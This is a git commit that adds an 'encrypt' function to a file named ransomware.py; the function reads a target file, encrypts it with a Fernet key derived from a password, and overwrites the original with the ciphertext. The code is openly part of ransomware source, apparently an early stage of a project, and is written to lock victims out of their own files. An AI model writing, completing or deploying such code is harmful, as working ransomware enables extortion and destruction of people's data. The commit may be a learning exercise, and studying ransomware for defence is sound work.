98bc98aa6d9f7df95a38b51d01ef0766b5d49413
AmbagaAbdoulayeKASSOGUE22115503 <ambaga.kass@gmail.com>
2024-02-16 14:09:59 +0100

    creation of the encrypt fucntion

--- ransomware.py
+++ ransomware.py
@@ -47,3 +47,15 @@ def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=Tru
     return base64.urlsafe_b64encode(derive_key)
 
 
+"""Given a filename (str) and key (bytes), it encrypts the file and write it"""
+def encrypt(filename, key):
+    f = Fernet(key)
+    with open(filename,"rb") as file:
+        #read all file data
+        file_data= file.read()
+    #encrypt data
+    encrypted_data = f.encrypt(file_data)
+    #write the encrypted file
+    with open(filename, "wb") as file:
+        file.write(encrypted_data)
+    
